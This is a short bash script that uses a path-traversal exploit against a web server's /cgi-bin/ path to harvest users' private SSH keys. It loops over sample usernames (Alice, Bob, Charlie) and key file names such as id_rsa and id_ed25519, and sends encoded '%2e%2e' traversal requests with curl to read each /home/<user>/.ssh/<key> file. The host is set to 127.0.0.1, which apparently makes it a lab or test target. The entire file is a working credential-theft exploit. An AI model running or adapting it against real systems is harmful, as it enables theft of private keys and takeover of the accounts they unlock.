#!/bin/bash

# Define your endpoint
RHOST=127.0.0.1


# Sample lists of inputs
names=("Alice" "Bob" "Charlie")
keys=("id_rsa" "id_ecdsa" "id_ed25519" "id_ed25519_sk" "id_ecdsa_sk" "id_dsa")

# Iterate over names and keys to make all possible combinations
for name in "${names[@]}"; do
  for key in "${keys[@]}"; do
    echo "checking for ${name}'s key: ${key}:"
    url="http://${RHOST}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/${name}/.ssh/${key}"
    
    # Use curl to make the request
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo;" "$url"
    
    # Add a newline for readability
    echo
  done
done
